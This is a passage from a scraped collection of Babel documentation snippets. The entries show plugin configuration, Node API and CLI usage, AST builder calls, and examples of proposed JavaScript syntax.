API\nDESCRIPTION: Transforms code using the Babel Node API, applying the specified plugin.  Requires @babel/core to be installed. The 'code' argument is the source code to transform.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-function-name.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-function-name\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Hack-style Pipeline Operator JavaScript\nDESCRIPTION: This code snippet demonstrates the use of the Hack-style pipeline operator with the `^` topic token. The pipeline operator allows for chaining function calls in a more readable way. The `^` token represents the value from the previous pipeline step.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2021-10-29-7.16.0.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\nlet values = getNames()\n  |> [\"default\"].concat(^\n  |> await loadValues(^);\n```\n\n----------------------------------------\n\nTITLE: Throw Expression Example JavaScript\nDESCRIPTION: Demonstrates the usage of throw expressions within a function parameter and a boolean expression. It throws an error if the parameter is not provided or if the condition `param === true` is false.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-throw-expressions.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nfunction test(param = throw new Error(\"required!\")) {\n  const test = param === true || throw new Error(\"Falsy!\");\n}\n```\n\n----------------------------------------\n\nTITLE: TSEnumDeclaration Migration Diff\nDESCRIPTION: This diff demonstrates the required change when using `t.tsEnumDeclaration` due to the AST shape change in Babel 8, requiring wrapping the `members` array within the `tsEnumBody` builder.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_60\n\nLANGUAGE: diff\nCODE:\n```\n// Create `enum ColorType { Red, Green, Blue }`\nt.tsEnumDeclaration(\n  t.identifier(\"ColorType\"),\n-  [\n+  t.tsEnumBody([\n    t.tsEnumMember(t.identifier(\"Red\")),\n    t.tsEnumMember(t.identifier(\"Green\")),\n    t.tsEnumMember(t.identifier(\"Blue\"))\n-  ],\n+  ]),\n)\n```\n\n----------------------------------------\n\nTITLE: Get Targets Function Signature TypeScript\nDESCRIPTION: TypeScript definition of the `getTargets` function, defining its input parameters, including options for config file paths, browserlist environment, and target overrides. It normalizes user-specified targets to a list of supported targets.\nSOURCE: https://github.com/babel/website/blob/main/docs/helper-compilation-targets.md#_snippet_6\n\nLANGUAGE: TypeScript\nCODE:\n```\ntype GetTargetsOption = {\n  // This is not the path of the config file, but the path where start searching it from\n  configPath?: string;\n\n  // The path of the config file\n  configFile?: string;\n\n  // The env to pass to browserslist\n  browserslistEnv?: string;\n\n  // true to disable config loading\n  ignoreBrowserslistConfig?: boolean;\n};\n\ntype InputTargets = {\n  ...Targets,\n\n  browsers?: Browsers,\n\n  // When `true`, this completely replaces the `browsers` option.\n  // When `intersect`, this is intersected with the `browsers`\n  // option (giving the higher browsers as the result).\n  esmodules?: boolean | \"intersect\",\n};\n\nfunction getTargets(\n  inputTargets: InputTargets = {},\n  options: GetTargetsOption = {}\n): Targets;\n```\n\n----------------------------------------\n\nTITLE: Using syntax-decorators via Node API\nDESCRIPTION: Transforms JavaScript code using the Babel Node API with the @babel/plugin-syntax-decorators plugin. It allows for programmatic transformation of code with decorator syntax support.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-decorators.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-syntax-decorators\"]\n});\n```\n\n----------------------------------------\n\nTITLE: Configuring Babel Plugin\nDESCRIPTION: Configures the @babel/plugin-syntax-dynamic-import plugin within a babel.config.json file. This enables the plugin to process dynamic import() syntax when Babel transforms code.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-dynamic-import.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-syntax-dynamic-import\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Configuration for Optional Chaining Assignment\nDESCRIPTION: This JSON configuration demonstrates how to configure Babel to support optional chaining assignment with the `@babel/plugin-proposal-optional-chaining-assign` plugin.  The `version` option is mandatory and specifies the proposal version.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2023-09-25-7.23.0.md#_snippet_6\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\n    [\"@babel/plugin-proposal-optional-chaining-assign\", {\n      \"version\": \"2023-07\"\n    }]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Throw Expressions Example JavaScript\nDESCRIPTION: This JavaScript code demonstrates the usage of throw expressions in a function parameter default value and within a logical OR expression. It enables the parsing of the throw expressions syntax.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-throw-expressions.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nfunction test(param = throw new Error('required!')) {\n  const test = param === true || throw new Error('Falsy!');\n}\n```\n\n----------------------------------------\n\nTITLE: Transforming from AST Synchronously\nDESCRIPTION: Demonstrates how to use `babel.transformFromAstSync` to synchronously transform an AST. It takes the AST, optional code string, and options, returning an object with the transformed code, source map, and AST. Requires @babel/core and babel.parseSync to generate the AST.\nSOURCE: https://github.com/babel/website/blob/main/docs/core.md#_snippet_14\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst sourceCode = \"if (true) return;\";\nconst parsedAst = babel.parseSync(sourceCode, {\n  parserOpts: { allowReturnOutsideFunction: true },\n});\nconst { code, map, ast } = babel.transformFromAstSync(\n  parsedAst,\n  sourceCode,\n  options\n);\n```\n\n----------------------------------------\n\nTITLE: Running Babel Doctor (Shell)\nDESCRIPTION: This command executes the `babel-doctor` tool within a project directory. It performs sanity checks to detect common Babel installation problems such as missing `.babelrc` files, duplicate Babel core modules, and outdated Babel core modules.  It outputs the results of the checks to the console.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-11-03-babel-doctor.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\n$ babel-doctor\n\nBabel Doctor\nRunning sanity checks on your system. This may take a few minutes...\n\n✔ Found config at /Users/sebastian/.babelrc\n✔ All babel packages appear to be up to date\n✔ No duplicate babel packages found\n\nEverything looks all right!\n\n```\n\n----------------------------------------\n\nTITLE: F# Pipeline Example with Arrow Functions\nDESCRIPTION: This JavaScript code demonstrates the F# Pipelines proposal, using arrow functions as placeholders. It showcases how to chain functions using the pipeline operator without introducing new placeholder tokens.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2018-07-19-whats-happening-with-the-pipeline-proposal.md#_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\nlet person = { score: 25 };\n\nlet newScore = person.score\n  |> double\n  |> (_ => add(7, _))\n  |> (_ => boundScore(0, 100, _));\n```\n\n----------------------------------------\n\nTITLE: Use Plugin via Node API (JavaScript)\nDESCRIPTION: Example of how to use the @babel/plugin-transform-object-super plugin via the Babel Node API.  This snippet shows how to programmatically transform code using `transformSync`. Requires `@babel/core`.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-object-super.md#_snippet_5\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-object-super\"],\n});\n```\n\n----------------------------------------\n\nTITLE: JSX Spread Attributes with Overrides\nDESCRIPTION: Illustrates how to use JSX spread attributes with regular attributes to override or set default class names.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-07-07-react-on-es6-plus.md#_snippet_13\n\nLANGUAGE: javascript\nCODE:\n```\n<div {...this.props} className=\"override\">\n  …\n</div>\n```\n\nLANGUAGE: javascript\nCODE:\n```\n<div className=\"base\" {...this.props}>\n  …\n</div>\n```\n\n----------------------------------------\n\nTITLE: Creating a ParenthesizedExpression in JavaScript\nDESCRIPTION: This code snippet demonstrates creating a `ParenthesizedExpression` AST node using `t.parenthesizedExpression(expression)`. It wraps an expression in parentheses. The `expression` parameter is the expression to be parenthesized.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_136\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.parenthesizedExpression(expression);\n```\n\n----------------------------------------\n\nTITLE: Creating Class Accessor Property (JavaScript)\nDESCRIPTION: Creates a `ClassAccessorProperty` AST node. This node represents a class accessor property, which is a special type of class property that allows for getter and setter methods to be defined for accessing the property. Parameters include the key, value, type annotation, decorators, computed flag, and static flag.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_20\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.classAccessorProperty(key, value, typeAnnotation, decorators, computed, static);\n```\n\n----------------------------------------\n\nTITLE: Using the Plugin via Node API\nDESCRIPTION: Shows how to use the Babel plugin programmatically via the Node API. It transforms the 'code' string using the specified plugin and returns the transformed output.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-bugfix-v8-spread-parameters-in-optional-chaining.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-bugfix-v8-spread-parameters-in-optional-chaining\"],\n});\n```\n\n----------------------------------------\n\nTITLE: CodeGenerator Class Removal Diff\nDESCRIPTION: This diff highlights the change required when migrating from using the deprecated `CodeGenerator` class to using the `generate` function in Babel 8.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_54\n\nLANGUAGE: diff\nCODE:\n```\n- new CodeGenerator(ast).generate()\n+ generate(ast)\n```\n\n----------------------------------------\n\nTITLE: Configuring Plugin via babel.config.json\nDESCRIPTION: Configures the Babel plugin within a `babel.config.json` file. This allows Babel to automatically use the plugin during the transformation process, converting import attributes to import assertions. No specific inputs or outputs are defined here; the plugin operates based on the code being transformed.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-import-attributes-to-assertions.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-proposal-import-attributes-to-assertions\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Configuration File Usage (No Options)\nDESCRIPTION: Example of using the plugin in a `babel.config.json` file without any specific options. This is the basic way to enable the plugin for your project.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-arrow-functions.md#_snippet_3\n\nLANGUAGE: babel.config.json\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-arrow-functions\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Compile Directory to Single File\nDESCRIPTION: Compiles all files in the `src` directory into a single concatenated file `script-compiled.js`. The `--out-file` option specifies the output file, and Babel handles the concatenation.\nSOURCE: https://github.com/babel/website/blob/main/docs/cli.md#_snippet_9\n\nLANGUAGE: Shell\nCODE:\n```\nnpx babel src --out-file script-compiled.js\n```\n\n----------------------------------------\n\nTITLE: Async Iteration Syntax JavaScript\nDESCRIPTION: This example showcases the `for await...of` syntax used for asynchronous iteration.  It iterates over an async iterable and processes each element.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-async-generators.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nasync function f() {\n  for await (let x of y) {\n    g(x);\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Babel Configuration with Top-Level Targets (New)\nDESCRIPTION: Example of a new Babel configuration using the top-level `targets` option.  This simplifies the configuration by defining targets in a single location, benefiting both presets and plugins. The target specifies browser versions to support.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2021-02-22-7.13.0.md#_snippet_1\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"targets\": \">1%, not ie 11\",\n  \"presets\": [\"@babel/preset-env\"],\n  \"plugins\": [\"polyfill-es-shims\"]\n}\n```\n\n----------------------------------------\n\nTITLE: transform-react-constant-elements: Hoisting constant React element - JavaScript\nDESCRIPTION: This snippet illustrates how the `transform-react-constant-elements` plugin hoists constant React elements. The plugin identifies that the `<div>` element with the `tabIndex` prop is constant and hoists it into a variable named `_ref`. This reduces the number of object creations during rendering, improving performance.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2017-02-13-6.23.0.md#_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nconst OFFSET = 3;\n\nvar Foo = React.createClass({\n  render: function () {\n    return (\n      <div tabIndex={OFFSET + 1} />\n    );\n  }\n});\n```\n\nLANGUAGE: javascript\nCODE:\n```\nconst OFFSET = 3;\n\nvar _ref = <div tabIndex={OFFSET + 1} />;\n\nvar Foo = React.createClass({\n  render: function () {\n    return _ref;\n  }\n});\n```\n\n----------------------------------------\n\nTITLE: Babel Configuration\nDESCRIPTION: This JSON configuration file shows how to enable the @babel/plugin-transform-jscript plugin in a Babel project.  It specifies the plugin within the 'plugins' array.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-jscript.md#_snippet_3\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-jscript\"]\n}\n```\n\n----------------------------------------\n\nTITLE: JavaScript Plugin Ordering with Disabling\nDESCRIPTION: Example demonstrating how to disable a plugin temporarily within the main configuration while enabling it in a specific override based on the test condition. This ensures the plugin executes in a specific order when enabled.\nSOURCE: https://github.com/babel/website/blob/main/docs/options.md#_snippet_17\n\nLANGUAGE: JavaScript\nCODE:\n```\nplugins: [\n  'one',\n  ['two', false],\n  'three',\n],\noverrides: [{\n  test: \"./src\",\n  plugins: [\n    'two',\n  ]\n}]\n```\n\n----------------------------------------\n\nTITLE: Unicode Regex Example Output JavaScript\nDESCRIPTION: This JavaScript code is the output of the Babel plugin transformation, showing how the Unicode regex is converted to a compatible form. It replaces the simple dot (.) with a more complex character class to properly match Unicode characters.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-unicode-regex.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar string = \"foo💩bar\";\nvar match = string.match(\n  /foo((?:[\\0-\\t\\x0B\\f\\x0E-\\u2027\\u202A-\\uD7FF\\uE000-\\uFFFF]|[\\uD800-\\uDBFF][\\uDC00-\\uDFFF]|[\\uD800-\\uDBFF](?![\\uDC00-\\uDFFF])|(?:[^\\uD800-\\uDBFF]|^)[\\uDC00-\\uDFFF]))bar/\n);\n```\n\n----------------------------------------\n\nTITLE: Install Babel Plugin via npm Shell\nDESCRIPTION: This command installs the @babel/plugin-transform-async-to-generator plugin as a development dependency using npm.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-async-to-generator.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-async-to-generator\n```\n\n----------------------------------------\n\nTITLE: Including @babel/standalone via UNPKG\nDESCRIPTION: This snippet shows how to include the @babel/standalone library in an HTML file using UNPKG. This allows you to use Babel in the browser without needing a build system.\nSOURCE: https://github.com/babel/website/blob/main/docs/standalone.md#_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<script src=\"https://unpkg.com/@babel/standalone/babel.min.js\"></script>\n```\n\n----------------------------------------\n\nTITLE: Transform Runtime Core-js Example (After)\nDESCRIPTION: Illustrates the transformation of code using the `corejs` option of the transform-runtime plugin. It replaces direct usage of built-ins with imports from `@babel/runtime-corejs3`, avoiding global polyfills. The example uses specific imports from `@babel/runtime-corejs3` to provide the necessary polyfills without global pollution.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-runtime.md#_snippet_12\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport _getIterator from \"@babel/runtime-corejs3/core-js/get-iterator\";\nimport _includesInstanceProperty from \"@babel/runtime-corejs3/core-js-stable/instance/includes\";\nimport _Promise from \"@babel/runtime-corejs3/core-js-stable/promise\";\nimport _Symbol from \"@babel/runtime-corejs3/core-js-stable/symbol\";\n\nvar sym = _Symbol();\n\nvar promise = _Promise.resolve();\n\nvar check = _includesInstanceProperty(arr).call(arr, \"yeah!\");\n\nconsole.log(_getIterator(arr));\n```\n\n----------------------------------------\n\nTITLE: Configure Babel Plugin in babel.config.json\nDESCRIPTION: This JSON configuration file shows how to enable the `@babel/plugin-transform-export-namespace-from` plugin by adding it to the `plugins` array in `babel.config.json`.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-export-namespace-from.md#_snippet_2\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-export-namespace-from\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Transform Template Literals (In)\nDESCRIPTION: This example showcases the input JavaScript code containing a template literal that will be transformed by the plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-template-literals.md#_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\n`foo${bar}`;\n```\n\n----------------------------------------\n\nTITLE: Run Babel with Plugin via CLI\nDESCRIPTION: Command to run the Babel CLI and transform a file using the @babel/plugin-transform-optional-catch-binding plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-optional-catch-binding.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\nbabel --plugins @babel/plugin-transform-optional-catch-binding script.js\n```\n\n----------------------------------------\n\nTITLE: Using a custom plugin with Babel.transform\nDESCRIPTION: This demonstrates how to use a custom Babel plugin with the Babel.transform function. The plugins option is used to specify which plugins to apply during transformation.\nSOURCE: https://github.com/babel/website/blob/main/docs/standalone.md#_snippet_11\n\nLANGUAGE: javascript\nCODE:\n```\nvar output = Babel.transform(\"function helloWorld() { alert(hello); }\", {\n  plugins: [\"lolizer\"],\n});\n// Returns \"function LOL() { LOL(LOL); }\"\n```\n\n----------------------------------------\n\nTITLE: JSX Transformation Example\nDESCRIPTION: This snippet demonstrates the core functionality of the plugin. It shows how a simple JSX tag is transformed by adding the `__self` prop, which is used for debugging in React.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-react-jsx-self.md#_snippet_0\n\nLANGUAGE: JSX\nCODE:\n```\n<sometag />\n```\n\nLANGUAGE: JSX\nCODE:\n```\n<sometag __self={this} />\n```\n\n----------------------------------------\n\nTITLE: Transpiling JavaScript Code Snippet with Babel in C#\nDESCRIPTION: This code snippet shows how to transpile a JavaScript code snippet using the Babel transformer in C#. The `Transform` method is called with the JavaScript code as a string argument. The result of the transformation is stored in the `result` variable.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/dotnet/usage.md#_snippet_2\n\nLANGUAGE: C#\nCODE:\n```\n// Transpiles a piece of code\nvar result = babel.Transform(\"class Foo { }\");\n```\n\n----------------------------------------\n\nTITLE: Guarded Expression Transformation\nDESCRIPTION: Demonstrates how the babel-plugin-minify-guarded-expressions plugin transforms guarded expressions. It shows an example of converting `!x && foo()` to `x || foo()` and simplifying `alert(0 && new Foo())` to `alert(0)`. This optimization improves code readability and potentially performance.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-minify-guarded-expressions.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\n!x && foo();\nalert(0 && new Foo());\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\nx || foo();\nalert(0);\n```\n\n----------------------------------------\n\nTITLE: Import with Attributes JavaScript\nDESCRIPTION: This JavaScript snippet demonstrates the import attributes syntax enabled by the plugin.  It imports a module with specific attributes, specifying the type of the imported resource (e.g., JSON). This allows Babel to parse the `with` keyword followed by attribute declarations.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-import-attributes.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport foo from \"./foo.json\" with { type: \"json\" };\n```\n\n----------------------------------------\n\nTITLE: Configuring npm Script for Babel Node with Babel Preset\nDESCRIPTION: This snippet demonstrates how to configure an npm script named `babel-node` in the `package.json` file. It utilizes `@babel/preset-env` and ignores specific directories `foo`, `bar`, and `baz` during the transpilation process.  This script allows running JavaScript files with Babel transformations using `babel-node`.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/nodemon/usage.md#_snippet_0\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"scripts\": {\n    \"babel-node\": \"babel-node --presets='@babel/preset-env' --ignore='foo|bar|baz'\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Babel Runtime Helper Usage\nDESCRIPTION: This JavaScript code demonstrates how `@babel/plugin-transform-runtime` and `@babel/runtime` can be used to extract and require modular helper functions, resulting in smaller output.  It replaces the inline helper with a `require` statement.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2018-08-27-7.0.0.md#_snippet_16\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar _classCallCheck = require(\"@babel/runtime/helpers/classCallCheck\");\n\nvar Person = function Person() {\n  _classCallCheck(this, Person);\n};\n```\n\n----------------------------------------\n\nTITLE: Install plugin via npm\nDESCRIPTION: This command shows how to install the plugin using npm. It installs the plugin as a development dependency.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-dynamic-import.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-dynamic-import\n```\n\n----------------------------------------\n\nTITLE: Iterable Object Usage (JavaScript)\nDESCRIPTION: This JavaScript code demonstrates destructuring and iterating over an iterable object. The `iterableIsArray` assumption tells Babel to treat the iterable object as an array during compilation.\nSOURCE: https://github.com/babel/website/blob/main/docs/assumptions.md#_snippet_7\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst [first, ...rest] = obj;\n\ncall(first, ...obj);\nlet arr = [first, ...obj];\n\nfor (const el of obj) {\n  console.log(el);\n}\n```\n\n----------------------------------------\n\nTITLE: Node API Usage (JavaScript)\nDESCRIPTION: This snippet shows how to use the Babel Node API to transform JavaScript code with the plugin. The `transformSync` function is used to apply the plugin to the provided code string.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-duplicate-named-capturing-groups-regex.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\\n  plugins: [\"@babel/plugin-transform-duplicate-named-capturing-groups-regex\"],\\n});\n```\n\n----------------------------------------\n\nTITLE: Using the Plugin via CLI (Shell)\nDESCRIPTION: This shell command illustrates how to use the @babel/plugin-transform-numeric-separator plugin directly via the Babel CLI. It transforms a script.js file using the specified plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-numeric-separator.md#_snippet_5\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-transform-numeric-separator script.js\n```\n\n----------------------------------------\n\nTITLE: Configure Undefined to Void Plugin: babel.config.json\nDESCRIPTION: This JSON configuration shows how to enable the plugin by adding `transform-undefined-to-void` to the plugins array in babel.config.json. This is the recommended way to use the plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-undefined-to-void.md#_snippet_3\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"transform-undefined-to-void\"]\n}\n```\n\n----------------------------------------\n\nTITLE: TypeScript 4.9 satisfies operator example\nDESCRIPTION: This TypeScript code demonstrates the usage of the `satisfies` operator, introduced in TypeScript 4.9. It showcases how the operator allows asserting a type without casting, preserving the original type of the variable while verifying compatibility with the asserted type.  It highlights the error case where the variable does not satisfy the specified type.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2022-10-27-7.20.0.md#_snippet_0\n\nLANGUAGE: TypeScript\nCODE:\n```\nlet a = { x: 1, y: 2 } as const;\n//  ^ type is { x: 1, y: 2 }\n\nlet b = a satisfies { [key: string]: number };\n//  ^ type is still { x: 1, y: 2 }, and not { [key: string]: number }!\n\na satisfies { [key: string]: string };\n// error! a does not satisfies that type\n```\n\n----------------------------------------\n\nTITLE: Using @babel/plugin-syntax-jsx with babel.config.json\nDESCRIPTION: This JSON configuration shows how to enable the @babel/plugin-syntax-jsx plugin by adding it to the plugins array in the babel.config.json file.  This enables JSX syntax parsing for all files processed by Babel that use this configuration.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-jsx.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-syntax-jsx\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Is Required Example JavaScript Config\nDESCRIPTION: Illustrates how to utilize the `isRequired` function within a `babel.config.js` file to check if a specific transform plugin is necessary based on the specified compilation targets.  It determines if the optional chaining transform is required.\nSOURCE: https://github.com/babel/website/blob/main/docs/helper-compilation-targets.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\nmodule.exports = api => {\n  const targets = api.targets();\n  // The targets have native optional chaining support\n  // if `transform-optional-chaining` is _not_ required\n  const optionalChainingSupported = !isRequired(\n    \"transform-optional-chaining\",\n    targets\n  );\n};\n```\n\n----------------------------------------\n\nTITLE: Babel Node API Usage (JavaScript)\nDESCRIPTION: Shows how to use the plugin via the Babel Node API. The `transformSync` function is used to transform the code, with the plugin specified in the `plugins` option.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-react-constant-elements.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-react-constant-elements\"]\n});\n```\n\n----------------------------------------\n\nTITLE: Transform Code with Babel Node API\nDESCRIPTION: This JavaScript snippet demonstrates how to use the Babel Node API to transform code with the minify-builtins plugin. It uses require(\"@babel/core\").transformSync to transform the provided code string with the specified plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-minify-builtins.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"minify-builtins\"]\n});\n```\n\n----------------------------------------\n\nTITLE: Using the Plugin via CLI\nDESCRIPTION: Executes Babel transformation using the command-line interface, applying the `@babel/plugin-proposal-import-attributes-to-assertions` plugin. This allows direct transformation of a specified JavaScript file (`script.js`) using the plugin. It requires Babel CLI to be installed.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-import-attributes-to-assertions.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nbabel --plugins @babel/plugin-proposal-import-attributes-to-assertions script.js\n```\n\n----------------------------------------\n\nTITLE: Filter Items Function Signature TypeScript\nDESCRIPTION: TypeScript definition of the `filterItems` function, specifying the types of its parameters and return value. It clarifies the input data structure, include/exclude sets, target environment, and plugin syntax map.\nSOURCE: https://github.com/babel/website/blob/main/docs/helper-compilation-targets.md#_snippet_5\n\nLANGUAGE: TypeScript\nCODE:\n```\nfunction filterItems(\n  list: { [feature: string]: Targets },\n\n  // A set of plugins that should always be included\n  includes: Set<string>,\n\n  // A set of plugins that should always be excluded\n  excludes: Set<string>,\n  targets: Targets,\n\n  // A set of plugins that should always be included if `includes` is empty\n  defaultIncludes: Array<string> | null,\n\n  // A set of plugins that should always be excluded if `excludes` is empty\n  defaultExcludes?: Array<string> | null,\n\n  // A map from transform plugin to syntax plugin for backward compatibility with older `@babel/parser` versions\n  pluginSyntaxMap?: Map<string, string | null>\n): Set<string>; // A set of enabled plugins\n```\n\n----------------------------------------\n\nTITLE: Optional Chaining Assignment Input Example (JavaScript)\nDESCRIPTION: This JavaScript code demonstrates the input code with optional chaining on the left-hand side of an assignment expression.  The `maybeOptions?.retries = 5;` line will be transformed by the plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-optional-chaining-assign.md#_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nfunction doSomething(maybeOptions) {\n  maybeOptions?.retries = 5;\n}\n```\n\n----------------------------------------\n\nTITLE: Configuration File Usage (With Options)\nDESCRIPTION: Example of configuring the plugin in a `babel.config.json` file with specific options. The example shows how to enable the 'spec' option.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-arrow-functions.md#_snippet_4\n\nLANGUAGE: babel.config.json\nCODE:\n```\n{\n  \"plugins\": [[\"@babel/plugin-transform-arrow-functions\", { \"spec\": true }]]\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Class Private Property (JavaScript)\nDESCRIPTION: Creates a `ClassPrivateProperty` AST node. This node represents a private property within a class. Parameters include the property's key (`key`), value (`value`), decorators (`decorators`), and static flag (`static`).\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_27\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.classPrivateProperty(key, value, decorators, static);\n```\n\n----------------------------------------\n\nTITLE: JavaScript Mixin Pattern Workaround\nDESCRIPTION: Shows a workaround to the mixin pattern limitation by adding an intermediate class in the inheritance chain. This allows Babel to identify and correctly wrap the native class.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-classes.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst ExtensibleArray = class extends Array {};\n\nclass Foo extends mixin(ExtensibleArray) {}\n```\n\n----------------------------------------\n\nTITLE: CLI Usage Shell\nDESCRIPTION: This shell command demonstrates how to use the Babel CLI to transform a JavaScript file using the @babel/plugin-transform-modules-umd plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-modules-umd.md#_snippet_13\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-transform-modules-umd script.js\n```\n\n----------------------------------------\n\nTITLE: Require Babel Register in JavaScript\nDESCRIPTION: This snippet demonstrates how to use `require` to load `@babel/register`.  This will transpile all subsequent `.es6`, `.es`, `.jsx`, and `.js` files required by Node.js. It should be included at the top of the application's entry point.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/babel_register/usage.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/register\");\n```\n\n----------------------------------------\n\nTITLE: Use plugin via Node API\nDESCRIPTION: This JavaScript code shows how to use the plugin via the Babel Node API. It transforms the 'code' string using the @babel/plugin-transform-for-of plugin.\nSOURCE: 